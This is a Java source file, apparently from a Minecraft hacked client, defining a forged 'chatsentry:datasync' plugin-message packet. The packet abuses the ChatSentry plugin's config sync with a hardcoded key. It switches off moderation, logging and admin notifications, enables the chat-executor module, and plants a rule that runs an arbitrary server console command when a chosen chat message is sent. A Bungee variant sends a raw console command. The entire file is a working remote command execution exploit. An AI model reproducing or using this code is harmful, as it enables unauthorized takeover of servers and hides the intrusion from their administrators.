package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.util.Objects;

public record ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, ChatSentryPayloadPacket> CODEC = CustomPayload.codecOf(ChatSentryPayloadPacket::write, ChatSentryPayloadPacket::new);
    public static final Id<ChatSentryPayloadPacket> ID = new Id<>(Identifier.of("chatsentry", "datasync"));

    private ChatSentryPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readBoolean(), buf.readString(), buf.readString());
    }

    public ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) {
        this.command = command;
        this.isBungee = isBungee;
        this.type = type;
        this.executionMessage = executionMessage;
    }

    private void write(PacketByteBuf buf) {
        final ByteArrayDataOutput out = ByteStreams.newDataOutput();
        if (isBungee) {
            out.writeUTF("console_command");
            out.writeUTF(command);
            buf.writeBytes(out.toByteArray());
        } else {
            if (Objects.equals(type, "config")) {
                out.writeUTF("sync");
                out.writeUTF("");
                out.writeUTF("skibidi");
                out.writeUTF("config.yml");
                out.writeUTF("""
                         check-for-updates: false
                         process-chat: true
                         process-commands: true
                         process-signs: true
                         process-anvils: true
                         process-books: true
                         context-prediction: true
                         disable-vanilla-spam-kick: true
                         network:
                         enable: false
                         sync-configs: true
                         global-admin-notifier-messages: true
                         enable-admin-notifier: false
                         enable-discord-notifier: false
                         enable-auto-punisher: false
                         enable-word-and-phrase-filter: false
                         enable-link-and-ad-blocker: false
                         enable-spam-blocker: false
                         enable-chat-cooldown: false
                         enable-anti-chat-flood: false
                         enable-unicode-remover: false
                         enable-cap-limiter: false
                         enable-anti-parrot: false
                         enable-chat-executor: true
                         enable-anti-statue-spambot: false
                         enable-anti-relog-spam: false
                         enable-anti-join-flood: false
                         enable-anti-command-prefix: false
                         enable-auto-grammar: false
                         enable-command-spy: false
                         enable-logging-for:
                         chat-cooldown: false
                         link-and-ad-blocker: true
                         word-and-phrase-filter: true
                         spam-blocker: true
                         unicode-remover: true
                         cap-limiter: true
                         anti-parrot: true
                         anti-chat-flood: true
                         anti-statue-spambot: false
                         chat-executor: false
                         clean-logs-older-than: 30
                         override-bypass-permissions:
                         chat-cooldown: false
                         link-and-ad-blocker: false
                         word-and-phrase-filter: false
                         spam-blocker: false
                         unicode-remover: false
                         cap-limiter: false
                         anti-parrot: false
                         anti-chat-flood: false
                         anti-statue-spambot: false
                         anti-join-flood: false
                         chat-executor: true
                         auto-grammar: false
                         anti-command-prefix: false
                         command-spy: false
                         lockdown:
                         active: false
                         current-mode: "only-known"
                         exempt-usernames:
                           - "Notch"
                           - "jeb_"
                         command-blacklist:
                         - "/tell"
                         """);
            } else {
                out.writeUTF("sync");
                out.writeUTF("modules");
                out.writeUTF("skibidi");
                out.writeUTF("chat-executor.yml");
                out.writeUTF("""
                         entries:
                           1:
                             match: "{regex}(REPLACE-THE-MESSAGE)"
                             set-matches-as: "{block}"
                             execute:
                               - "{console_cmd}: REPLACE-THE-COMMAND"
                               - "{player_msg}: &a&lSUCCESS!"
                         """.replaceAll("REPLACE-THE-COMMAND", command)
                        .replaceAll("REPLACE-THE-MESSAGE", executionMessage));
            }
            out.writeUTF("2822111278697");
            buf.writeBytes(out.toByteArray());
        }
    }

    public CustomPayload.Id<ChatSentryPayloadPacket> getId() {
        return ID;
    }
}